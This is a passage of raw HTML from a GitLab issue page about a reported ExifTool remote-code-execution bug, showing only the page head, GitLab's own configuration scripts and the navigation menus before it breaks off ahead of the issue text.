





<!DOCTYPE html>
<html class="gl-light ui-neutral with-top-bar with-header " lang="en">
<head prefix="og: http://ogp.me/ns#">
<meta charset="utf-8">
<meta content="IE=edge" http-equiv="X-UA-Compatible">
<meta content="width=device-width, initial-scale=1" name="viewport">
<title>RCE when removing metadata with ExifTool (#327121) · Issues · GitLab.org / GitLab · GitLab</title>
<script nonce="4Pet/VRJ40dYDe4FWrh3Tg==">
//<![CDATA[
window.gon={};gon.api_version="v4";gon.default_avatar_url="https://gitlab.com/assets/no_avatar-849f9c04a3a0d0cea2424ae97b27447dc64a7dbfae83c036c45b403392f0e8ba.png";gon.max_file_size=100;gon.asset_host=null;gon.webpack_public_path="/assets/webpack/";gon.relative_url_root="";gon.user_color_mode="gl-light";gon.user_color_scheme="white";gon.markdown_surround_selection=null;gon.markdown_automatic_lists=null;gon.math_rendering_limits_enabled=true;gon.analytics_url="https://collector.prd-278964.gl-product-analytics.com";gon.analytics_id="715db59f-f350-4bfd-aef8-e7a7f0c023f0";gon.sentry_dsn="https://f5573e26de8f4293b285e556c35dfd6e@new-sentry.gitlab.net/4";gon.sentry_environment="gprd";gon.sentry_clientside_traces_sample_rate=0.05;gon.recaptcha_api_server_url="https://www.recaptcha.net/recaptcha/api.js";gon.recaptcha_sitekey="6LfAERQTAAAAAL4GYSiAMGLbcLyUIBSfPrDNJgeC";gon.gitlab_url="https://gitlab.com";gon.promo_url="https://about.gitlab.com";gon.forum_url="https://forum.gitlab.com";gon.docs_url="https://docs.gitlab.com";gon.revision="b89e371b9d4";gon.feature_category="team_planning";gon.gitlab_logo="/assets/gitlab_logo-2957169c8ef64c58616a1ac3f4fc626e8a35ce4eb3ed31bb0d873712f2a041a0.png";gon.secure=true;gon.sprite_icons="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg";gon.sprite_file_icons="/assets/file_icons/file_icons-7cd3d6c3b29a6d972895f36472978a4b5adb4b37f9b5d0716a380e82389f7e0e.svg";gon.emoji_sprites_css_path="/assets/emoji_sprites-bd26211944b9d072037ec97cb138f1a52cd03ef185cd38b8d1fcc963245199a1.css";gon.emoji_backend_version=4;gon.gridstack_css_path="/assets/lazy_bundles/gridstack-5fcfd4ffbea1db04eaf7f16521bcab19ae3af042c8b4afe8d16781eda5a70799.css";gon.test_env=false;gon.disable_animations=null;gon.suggested_label_colors={"#cc338b":"Magenta-pink","#dc143c":"Crimson","#c21e56":"Rose red","#cd5b45":"Dark coral","#ed9121":"Carrot orange","#eee600":"Titanium yellow","#009966":"Green-cyan","#8fbc8f":"Dark sea green","#6699cc":"Blue-gray","#e6e6fa":"Lavender","#9400d3":"Dark violet","#330066":"Deep violet","#36454f":"Charcoal grey","#808080":"Gray"};gon.first_day_of_week=0;gon.time_display_relative=true;gon.time_display_format=0;gon.ee=true;gon.jh=false;gon.dot_com=true;gon.uf_error_prefix="UF";gon.pat_prefix="glpat-";gon.keyboard_shortcuts_enabled=true;gon.diagramsnet_url="https://embed.diagrams.net";gon.features={"sourceEditorToolbar":false,"vscodeWebIde":true,"uiForOrganizations":false,"organizationSwitching":false,"findAndReplace":false,"removeMonitorMetrics":true,"workItemsViewPreference":false,"searchButtonTopRight":false,"duoChatDynamicDimension":false,"advancedContextResolver":true,"preserveMarkdown":false,"issuesGridView":false,"serviceDeskTicket":false,"issuesListDrawer":false,"notificationsTodosButtons":false,"glqlIntegration":true,"workItemsBeta":true,"workItemsAlpha":false,"workItems":true,"epicWidgetEditConfirmation":false,"namespaceLevelWorkItems":false,"okrsMvc":false,"workItemEpics":true};gon.roadmap_epics_limit=1000;gon.subscriptions_url="https://customers.gitlab.com";gon.subscriptions_legacy_sign_in_url="https://customers.gitlab.com/customers/sign_in?legacy=true";gon.billing_accounts_url="https://customers.gitlab.com/billing_accounts";gon.payment_form_url="https://customers.gitlab.com/payment_forms/cc_validation";gon.payment_validation_form_id="payment_method_validation";gon.licensed_features={"escalationPolicies":true,"okrs":true};gon.abilities={"summarizeComments":false,"measureCommentTemperature":false};
//]]>
</script>


<script nonce="4Pet/VRJ40dYDe4FWrh3Tg==">
//<![CDATA[
var gl = window.gl || {};
gl.startup_calls = {"/gitlab-org/gitlab/-/issues/327121/related_branches":{},"/gitlab-org/gitlab/-/issues/327121/discussions.json?per_page=20":{},"/gitlab-org/gitlab/-/issues/327121.json?serializer=sidebar_extras":{}};
gl.startup_graphql_calls = [{"query":"query getDesignList($fullPath: ID!, $iid: String!, $atVersion: DesignManagementVersionID) {\n  project(fullPath: $fullPath) {\n    __typename\n    id\n    issue(iid: $iid) {\n      __typename\n      id\n      designCollection {\n        __typename\n        copyState\n        designs(atVersion: $atVersion) {\n          __typename\n          nodes {\n            __typename\n            id\n            event\n            filename\n            notesCount\n            image\n            imageV432x230\n            currentUserTodos(state: pending) {\n              __typename\n              nodes {\n                __typename\n                id\n              }\n            }\n          }\n        }\n        versions {\n          __typename\n          nodes {\n            __typename\n            id\n            sha\n            createdAt\n            author {\n              __typename\n              id\n              name\n              avatarUrl\n            }\n          }\n        }\n      }\n    }\n  }\n}\n","variables":{"fullPath":"gitlab-org/gitlab","iid":"327121","atVersion":null}},{"query":"query permissions($fullPath: ID!, $iid: String!) {\n  project(fullPath: $fullPath) {\n    __typename\n    id\n    issue(iid: $iid) {\n      __typename\n      id\n      userPermissions {\n        __typename\n        createDesign\n      }\n    }\n  }\n}\n","variables":{"fullPath":"gitlab-org/gitlab","iid":"327121"}}];

if (gl.startup_calls && window.fetch) {
  Object.keys(gl.startup_calls).forEach(apiCall => {
   gl.startup_calls[apiCall] = {
      fetchCall: fetch(apiCall, {
        // Emulate XHR for Rails AJAX request checks
        headers: {
          'X-Requested-With': 'XMLHttpRequest'
        },
        // fetch won’t send cookies in older browsers, unless you set the credentials init option.
        // We set to `same-origin` which is default value in modern browsers.
        // See https://github.com/whatwg/fetch/pull/585 for more information.
        credentials: 'same-origin'
      })
    };
  });
}
if (gl.startup_graphql_calls && window.fetch) {
  const headers = {"X-CSRF-Token":"K8oc8lNgtHyyr-ROQ7Ng-BSSfOvJrfwXj_3joYM2oXpBPvgJ7UFek0CYut9OdMwxQK3uDKja5mpLnYutTAFMVg","x-gitlab-feature-category":"team_planning"};
  const url = `https://gitlab.com/api/graphql`

  const opts = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      ...headers,
    }
  };

  gl.startup_graphql_calls = gl.startup_graphql_calls.map(call => ({
    ...call,
    fetchCall: fetch(url, {
      ...opts,
      credentials: 'same-origin',
      body: JSON.stringify(call)
    })
  }))
}


//]]>
</script>



<link rel="stylesheet" href="/assets/application-885ad321e4c6048268118763d892168d22a8cfaa28cd45cf320b22faadcbc92a.css" />
<link rel="stylesheet" href="/assets/page_bundles/design_management-f20ae9b5b8c9a0f793e3ffa2ddc13953bfd683e1d351c8e6cc75e0fcd4ddde90.css" /><link rel="stylesheet" href="/assets/page_bundles/incidents-b9f383aefa56f0a72990496e4a4b3aaf2c525843283a1c0c3d85876537187397.css" /><link rel="stylesheet" href="/assets/page_bundles/issuable-e25480d2326300d5c49ad31dbd847a53e39fc33a5fd595a961dd7238e411b558.css" /><link rel="stylesheet" href="/assets/page_bundles/notes_shared-7e727ab1e91b421915feadeb04a1b9d57213cb1b2f8f56f4d894b34d6b42e9b3.css" /><link rel="stylesheet" href="/assets/page_bundles/issues_show-785541c300108b8ecf7c08fd02bd67f4d6b9d59c86918ecfbf91bae5e1c8ffa8.css" /><link rel="stylesheet" href="/assets/page_bundles/work_items-22a76cdd1fe2ae5431b7ff603f86212acaf81b49c4a932f19e3b3222dc1881ee.css" /><link rel="stylesheet" href="/assets/page_bundles/labels-3508460b8d6f839e9d60de1f2065fdaf7f057efab04cf71966acef6a86fe9b41.css" /><link rel="stylesheet" href="/assets/page_bundles/commit_description-1e2cba4dda3c7b30dd84924809020c569f1308dea51520fe1dd5d4ce31403195.css" />
<link rel="stylesheet" href="/assets/application_utilities-58bec0f2dc46133fc9e8548af9854688398e9d7263cc0fd95ec5739f2a069dec.css" />
<link rel="stylesheet" href="/assets/tailwind-25f655cc55079b4f6b973a695ec1b611d85739a1ae3add6b38a953a866603fdc.css" />


<link rel="stylesheet" href="/assets/fonts-fae5d3f79948bd85f18b6513a025f863b19636e85b09a1492907eb4b1bb0557b.css" />
<link rel="stylesheet" href="/assets/highlight/themes/white-e31d355458ead69f8798dbb62f54c60c4ccc7db35289cbbd2353ddfdf5109aac.css" />

<script src="/assets/webpack/runtime.5cb5fe21.bundle.js" defer="defer" nonce="4Pet/VRJ40dYDe4FWrh3Tg=="></script>
<script src="/assets/webpack/main.d969bdd6.chunk.js" defer="defer" nonce="4Pet/VRJ40dYDe4FWrh3Tg=="></script>
<script src="/assets/webpack/tracker.493c474d.chunk.js" defer="defer" nonce="4Pet/VRJ40dYDe4FWrh3Tg=="></script>
<script src="/assets/webpack/analytics.02a84ab3.chunk.js" defer="defer" nonce="4Pet/VRJ40dYDe4FWrh3Tg=="></script>
<script nonce="4Pet/VRJ40dYDe4FWrh3Tg==">
//<![CDATA[
window.snowplowOptions = {"namespace":"gl","hostname":"snowplowprd.trx.gitlab.net","cookieDomain":".gitlab.com","appId":"gitlab","formTracking":true,"linkClickTracking":true}

gl = window.gl || {};
gl.snowplowStandardContext = {"schema":"iglu:com.gitlab/gitlab_standard/jsonschema/1-1-1","data":{"environment":"production","source":"gitlab-rails","correlation_id":"01JH33EVVPTKCHBJ4T893JTXJN","plan":"gold","extra":{},"user_id":null,"global_user_id":null,"is_gitlab_team_member":null,"namespace_id":9970,"project_id":278964,"feature_enabled_by_namespace_ids":null,"realm":"saas","instance_id":"ea8bf810-1d6f-4a6a-b4fd-93e8cbd8b57f","host_name":"gitlab-cny-webservice-web-b459b88cf-mzm2q","instance_version":"17.8.0","context_generated_at":"2025-01-08T14:00:26.141Z"}}
gl.snowplowPseudonymizedPageUrl = "https://gitlab.com/namespace9970/project278964/-/issues/327121";
gl.maskedDefaultReferrerUrl = null;
gl.ga4MeasurementId = 'G-ENFH3X7M5Y';


//]]>
</script>
<link rel="preload" href="/assets/application_utilities-58bec0f2dc46133fc9e8548af9854688398e9d7263cc0fd95ec5739f2a069dec.css" as="style" type="text/css" nonce="gVThgkpVNRM4M2+JVl9f8w==">
<link rel="preload" href="/assets/application-885ad321e4c6048268118763d892168d22a8cfaa28cd45cf320b22faadcbc92a.css" as="style" type="text/css" nonce="gVThgkpVNRM4M2+JVl9f8w==">
<link rel="preload" href="/assets/highlight/themes/white-e31d355458ead69f8798dbb62f54c60c4ccc7db35289cbbd2353ddfdf5109aac.css" as="style" type="text/css" nonce="gVThgkpVNRM4M2+JVl9f8w==">
<link crossorigin="" href="https://snowplowprd.trx.gitlab.net" rel="preconnect">
<link as="font" crossorigin="" href="/assets/gitlab-sans/GitLabSans-1e0a5107ea3bbd4be93e8ad2c503467e43166cd37e4293570b490e0812ede98b.woff2" rel="preload">
<link as="font" crossorigin="" href="/assets/gitlab-sans/GitLabSans-Italic-38eaf1a569a54ab28c58b92a4a8de3afb96b6ebc250cf372003a7b38151848cc.woff2" rel="preload">
<link as="font" crossorigin="" href="/assets/gitlab-mono/GitLabMono-08d2c5e8ff8fd3d2d6ec55bc7713380f8981c35f9d2df14e12b835464d6e8f23.woff2" rel="preload">
<link as="font" crossorigin="" href="/assets/gitlab-mono/GitLabMono-Italic-38e58d8df29485a20c550da1d0111e2c2169f6dcbcf894f2cd3afbdd97bcc588.woff2" rel="preload">
<link rel="preload" href="/assets/fonts-fae5d3f79948bd85f18b6513a025f863b19636e85b09a1492907eb4b1bb0557b.css" as="style" type="text/css" nonce="gVThgkpVNRM4M2+JVl9f8w==">



<script src="/assets/webpack/sentry.b707854c.chunk.js" defer="defer" nonce="4Pet/VRJ40dYDe4FWrh3Tg=="></script>

<script src="/assets/webpack/9.49e5c3e3.chunk.js" defer="defer" nonce="4Pet/VRJ40dYDe4FWrh3Tg=="></script>
<script src="/assets/webpack/11.e2e145a2.chunk.js" defer="defer" nonce="4Pet/VRJ40dYDe4FWrh3Tg=="></script>
<script src="/assets/webpack/13.07e95957.chunk.js" defer="defer" nonce="4Pet/VRJ40dYDe4FWrh3Tg=="></script>
<script src="/assets/webpack/commons-pages.groups.analytics.dashboards-pages.groups.harbor.repositories-pages.groups.iteration_ca-b07ae190.ba6536d6.chunk.js" defer="defer" nonce="4Pet/VRJ40dYDe4FWrh3Tg=="></script>
<script src="/assets/webpack/commons-pages.groups.new-pages.import.gitlab_projects.new-pages.import.manifest.new-pages.projects.n-44c6c18e.3be560a5.chunk.js" defer="defer" nonce="4Pet/VRJ40dYDe4FWrh3Tg=="></script>
<script src="/assets/webpack/commons-pages.search.show-super_sidebar.f7a558c9.chunk.js" defer="defer" nonce="4Pet/VRJ40dYDe4FWrh3Tg=="></script>
<script src="/assets/webpack/super_sidebar.36f367ce.chunk.js" defer="defer" nonce="4Pet/VRJ40dYDe4FWrh3Tg=="></script>
<script src="/assets/webpack/commons-pages.projects-pages.projects.activity-pages.projects.alert_management.details-pages.project-bce54798.24ff9b3b.chunk.js" defer="defer" nonce="4Pet/VRJ40dYDe4FWrh3Tg=="></script>
<script src="/assets/webpack/pages.projects.issues.show.36b1e9b1.chunk.js" defer="defer" nonce="4Pet/VRJ40dYDe4FWrh3Tg=="></script>

<meta content="object" property="og:type">
<meta content="GitLab" property="og:site_name">
<meta content="RCE when removing metadata with ExifTool (#327121) · Issues · GitLab.org / GitLab · GitLab" property="og:title">
<meta content="HackerOne report #1154542 by vakzz on 2021-04-07: Report | Attachments | How..." property="og:description">
<meta content="https://gitlab.com/uploads/-/system/project/avatar/278964/project_avatar.png" property="og:image">
<meta content="64" property="og:image:width">
<meta content="64" property="og:image:height">
<meta content="https://gitlab.com/gitlab-org/gitlab/-/issues/327121" property="og:url">
<meta content="summary" property="twitter:card">
<meta content="RCE when removing metadata with ExifTool (#327121) · Issues · GitLab.org / GitLab · GitLab" property="twitter:title">
<meta content="HackerOne report #1154542 by vakzz on 2021-04-07: Report | Attachments | How..." property="twitter:description">
<meta content="https://gitlab.com/uploads/-/system/project/avatar/278964/project_avatar.png" property="twitter:image">
<meta property="twitter:label1" content="Author"><meta property="twitter:data1" content="GitLab SecurityBot">
<meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="mP4f3vwzDU8U6Wjj3B4Xq9ta77hpoEyvV_XNt97h9UzyCvslQhLnoObeNnLR2btij2V9XwjXVtKTlaW7EdYYYA" />
<meta name="csp-nonce" content="4Pet/VRJ40dYDe4FWrh3Tg==" />
<meta name="action-cable-url" content="/-/cable" />
<link href="/-/manifest.json" rel="manifest">
<link rel="icon" type="image/png" href="/assets/favicon-yellow-018213ceb87b472388095d0264be5b4319ef47471dacea03c83ecc233ced2fd5.png" id="favicon" data-original-href="/assets/favicon-yellow-018213ceb87b472388095d0264be5b4319ef47471dacea03c83ecc233ced2fd5.png" />
<link rel="apple-touch-icon" type="image/x-icon" href="/assets/apple-touch-icon-b049d4bc0dd9626f31db825d61880737befc7835982586d015bded10b4435460.png" />
<link href="/search/opensearch.xml" rel="search" title="Search GitLab" type="application/opensearchdescription+xml">




<meta content="HackerOne report #1154542 by vakzz on 2021-04-07: Report | Attachments | How..." name="description">
<meta content="#ececef" name="theme-color">
</head>

<body class="tab-width-8 gl-browser-chrome gl-platform-windows" data-group="gitlab-org" data-group-full-path="gitlab-org" data-namespace-id="9970" data-page="projects:issues:show" data-page-type-id="327121" data-project="gitlab" data-project-full-path="gitlab-org/gitlab" data-project-id="278964">
<script nonce="4Pet/VRJ40dYDe4FWrh3Tg==">
//<![CDATA[
gl = window.gl || {};
gl.GfmAutoComplete = gl.GfmAutoComplete || {};
gl.GfmAutoComplete.dataSources = {"epics":"/gitlab-org/gitlab/-/autocomplete_sources/epics","iterations":"/gitlab-org/gitlab/-/autocomplete_sources/iterations","vulnerabilities":"/gitlab-org/gitlab/-/autocomplete_sources/vulnerabilities","members":"/gitlab-org/gitlab/-/autocomplete_sources/members?type=Issue\u0026type_id=327121","issues":"/gitlab-org/gitlab/-/autocomplete_sources/issues","mergeRequests":"/gitlab-org/gitlab/-/autocomplete_sources/merge_requests","labels":"/gitlab-org/gitlab/-/autocomplete_sources/labels?type=Issue\u0026type_id=327121","milestones":"/gitlab-org/gitlab/-/autocomplete_sources/milestones","commands":"/gitlab-org/gitlab/-/autocomplete_sources/commands?type=Issue\u0026type_id=327121","snippets":"/gitlab-org/gitlab/-/autocomplete_sources/snippets","contacts":"/gitlab-org/gitlab/-/autocomplete_sources/contacts?type=Issue\u0026type_id=327121","wikis":null};


//]]>
</script>
<script nonce="4Pet/VRJ40dYDe4FWrh3Tg==">
//<![CDATA[
gl = window.gl || {};
gl.client = {"isChrome":true,"isWindows":true};


//]]>
</script>


<header class="header-logged-out" data-testid="navbar">
<a class="gl-sr-only gl-accessibility" href="#content-body">Skip to content</a>
<div class="container-fluid">
<nav aria-label="Explore GitLab" class="header-logged-out-nav gl-flex gl-gap-3 gl-justify-between">
<div class="gl-flex gl-items-center gl-gap-1">
<span class="gl-sr-only">GitLab</span>
<a title="Homepage" id="logo" class="header-logged-out-logo has-tooltip" aria-label="Homepage" data-track-label="main_navigation" data-track-action="click_gitlab_logo_link" data-track-property="navigation_top" href="/"><svg aria-hidden="true" role="img" class="tanuki-logo" width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path class="tanuki-shape tanuki" d="m24.507 9.5-.034-.09L21.082.562a.896.896 0 0 0-1.694.091l-2.29 7.01H7.825L5.535.653a.898.898 0 0 0-1.694-.09L.451 9.411.416 9.5a6.297 6.297 0 0 0 2.09 7.278l.012.01.03.022 5.16 3.867 2.56 1.935 1.554 1.176a1.051 1.051 0 0 0 1.268 0l1.555-1.176 2.56-1.935 5.197-3.89.014-.01A6.297 6.297 0 0 0 24.507 9.5Z"
        fill="#E24329"/>
  <path class="tanuki-shape right-cheek" d="m24.507 9.5-.034-.09a11.44 11.44 0 0 0-4.56 2.051l-7.447 5.632 4.742 3.584 5.197-3.89.014-.01A6.297 6.297 0 0 0 24.507 9.5Z"
        fill="#FC6D26"/>
  <path class="tanuki-shape chin" d="m7.707 20.677 2.56 1.935 1.555 1.176a1.051 1.051 0 0 0 1.268 0l1.555-1.176 2.56-1.935-4.743-3.584-4.755 3.584Z"
        fill="#FCA326"/>
  <path class="tanuki-shape left-cheek" d="M5.01 11.461a11.43 11.43 0 0 0-4.56-2.05L.416 9.5a6.297 6.297 0 0 0 2.09 7.278l.012.01.03.022 5.16 3.867 4.745-3.584-7.444-5.632Z"
        fill="#FC6D26"/>
</svg>

</a><a class="gl-badge badge badge-pill badge-success canary-badge" data-testid="canary_badge_link" href="https://next.gitlab.com" rel="noopener noreferrer" target="_blank"><span class="gl-badge-content">Next
</span></a></div>
<ul class="gl-list-none gl-p-0 gl-m-0 gl-flex gl-gap-3 gl-items-center gl-grow">
<li class="header-logged-out-nav-item header-logged-out-dropdown md:gl-hidden">
<button class="header-logged-out-toggle" data-toggle="dropdown" type="button">
<span class="gl-sr-only">
Menu
</span>
<svg class="s16" data-testid="hamburger-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#hamburger"></use></svg>
</button>
<div class="dropdown-menu">
<ul>
<li>
<a href="https://about.gitlab.com/why-gitlab">Why GitLab
</a></li>
<li>
<a href="https://about.gitlab.com/pricing">Pricing
</a></li>
<li>
<a href="https://about.gitlab.com/sales">Contact Sales
</a></li>
<li>
<a href="/explore">Explore</a>
</li>
</ul>
</div>
</li>
<li class="header-logged-out-nav-item gl-hidden md:gl-inline-block">
<a href="https://about.gitlab.com/why-gitlab">Why GitLab
</a></li>
<li class="header-logged-out-nav-item gl-hidden md:gl-inline-block">
<a href="https://about.gitlab.com/pricing">Pricing
</a></li>
<li class="header-logged-out-nav-item gl-hidden gl-inline-block">
<a href="https://about.gitlab.com/sales">Contact Sales
</a></li>
<li class="header-logged-out-nav-item gl-hidden md:gl-inline-block">
<a class="" href="/explore">Explore</a>
</li>
</ul>
<ul class="gl-list-none gl-p-0 gl-m-0 gl-flex gl-gap-3 gl-items-center gl-justify-end">
<li class="header-logged-out-nav-item">
<a href="/users/sign_in?redirect_to_referer=yes">Sign in</a>
</li>
<li class="header-logged-out-nav-item">
<a class="gl-button btn btn-md btn-confirm !gl-inline-flex" href="/users/sign_up"><span class="gl-button-text">
Get free trial

</span>

</a></li>
</ul>
</nav>
</div>
</header>

<div class="layout-page page-gutter right-sidebar-expanded page-with-super-sidebar">
<aside class="js-super-sidebar super-sidebar super-sidebar-loading" data-command-palette="{&quot;project_files_url&quot;:&quot;/gitlab-org/gitlab/-/files/master?format=json&quot;,&quot;project_blob_url&quot;:&quot;/gitlab-org/gitlab/-/blob/master&quot;}" data-force-desktop-expanded-sidebar="" data-is-saas="true" data-root-path="/" data-sidebar="{&quot;whats_new_most_recent_release_items_count&quot;:6,&quot;whats_new_version_digest&quot;:&quot;c955dbe1b30a1468b032fe6896086eda50f884ff9559d966e5ef75c34eee3ff0&quot;,&quot;is_logged_in&quot;:false,&quot;context_switcher_links&quot;:[{&quot;title&quot;:&quot;Explore&quot;,&quot;link&quot;:&quot;/explore&quot;,&quot;icon&quot;:&quot;compass&quot;}],&quot;current_menu_items&quot;:[{&quot;id&quot;:&quot;project_overview&quot;,&quot;title&quot;:&quot;GitLab&quot;,&quot;avatar&quot;:&quot;/uploads/-/system/project/avatar/278964/project_avatar.png&quot;,&quot;entity_id&quot;:278964,&quot;link&quot;:&quot;/gitlab-org/gitlab&quot;,&quot;link_classes&quot;:&quot;shortcuts-project&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;manage_menu&quot;,&quot;title&quot;:&quot;Manage&quot;,&quot;icon&quot;:&quot;users&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/activity&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;activity&quot;,&quot;title&quot;:&quot;Activity&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/activity&quot;,&quot;link_classes&quot;:&quot;shortcuts-project-activity&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;members&quot;,&quot;title&quot;:&quot;Members&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/project_members&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;labels&quot;,&quot;title&quot;:&quot;Labels&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/labels&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;plan_menu&quot;,&quot;title&quot;:&quot;Plan&quot;,&quot;icon&quot;:&quot;planning&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/issues&quot;,&quot;is_active&quot;:true,&quot;items&quot;:[{&quot;id&quot;:&quot;project_issue_list&quot;,&quot;title&quot;:&quot;Issues&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/issues&quot;,&quot;pill_count_field&quot;:&quot;openIssuesCount&quot;,&quot;link_classes&quot;:&quot;shortcuts-issues has-sub-items&quot;,&quot;is_active&quot;:true},{&quot;id&quot;:&quot;boards&quot;,&quot;title&quot;:&quot;Issue boards&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/boards&quot;,&quot;link_classes&quot;:&quot;shortcuts-issue-boards&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;milestones&quot;,&quot;title&quot;:&quot;Milestones&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/milestones&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;iterations&quot;,&quot;title&quot;:&quot;Iterations&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/cadences&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;requirements&quot;,&quot;title&quot;:&quot;Requirements&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/requirements_management/requirements&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;code_menu&quot;,&quot;title&quot;:&quot;Code&quot;,&quot;icon&quot;:&quot;code&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/merge_requests&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;project_merge_request_list&quot;,&quot;title&quot;:&quot;Merge requests&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/merge_requests&quot;,&quot;pill_count_field&quot;:&quot;openMergeRequestsCount&quot;,&quot;link_classes&quot;:&quot;shortcuts-merge_requests&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;files&quot;,&quot;title&quot;:&quot;Repository&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/tree/master&quot;,&quot;link_classes&quot;:&quot;shortcuts-tree&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;branches&quot;,&quot;title&quot;:&quot;Branches&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/branches&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;commits&quot;,&quot;title&quot;:&quot;Commits&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/commits/master?ref_type=heads&quot;,&quot;link_classes&quot;:&quot;shortcuts-commits&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;tags&quot;,&quot;title&quot;:&quot;Tags&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/tags&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;graphs&quot;,&quot;title&quot;:&quot;Repository graph&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/network/master?ref_type=heads&quot;,&quot;link_classes&quot;:&quot;shortcuts-network&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;compare&quot;,&quot;title&quot;:&quot;Compare revisions&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/compare?from=master\u0026to=master&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;project_snippets&quot;,&quot;title&quot;:&quot;Snippets&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/snippets&quot;,&quot;link_classes&quot;:&quot;shortcuts-snippets&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;file_locks&quot;,&quot;title&quot;:&quot;Locked files&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/path_locks&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;build_menu&quot;,&quot;title&quot;:&quot;Build&quot;,&quot;icon&quot;:&quot;rocket&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/pipelines&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;pipelines&quot;,&quot;title&quot;:&quot;Pipelines&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/pipelines&quot;,&quot;link_classes&quot;:&quot;shortcuts-pipelines&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;jobs&quot;,&quot;title&quot;:&quot;Jobs&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/jobs&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;pipeline_schedules&quot;,&quot;title&quot;:&quot;Pipeline schedules&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/pipeline_schedules&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;test_cases&quot;,&quot;title&quot;:&quot;Test cases&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/quality/test_cases&quot;,&quot;link_classes&quot;:&quot;shortcuts-test-cases&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;artifacts&quot;,&quot;title&quot;:&quot;Artifacts&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/artifacts&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;deploy_menu&quot;,&quot;title&quot;:&quot;Deploy&quot;,&quot;icon&quot;:&quot;deployments&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/releases&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;releases&quot;,&quot;title&quot;:&quot;Releases&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/releases&quot;,&quot;link_classes&quot;:&quot;shortcuts-deployments-releases&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;packages_registry&quot;,&quot;title&quot;:&quot;Package Registry&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/packages&quot;,&quot;link_classes&quot;:&quot;shortcuts-container-registry&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;container_registry&quot;,&quot;title&quot;:&quot;Container Registry&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/container_registry&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;model_registry&quot;,&quot;title&quot;:&quot;Model 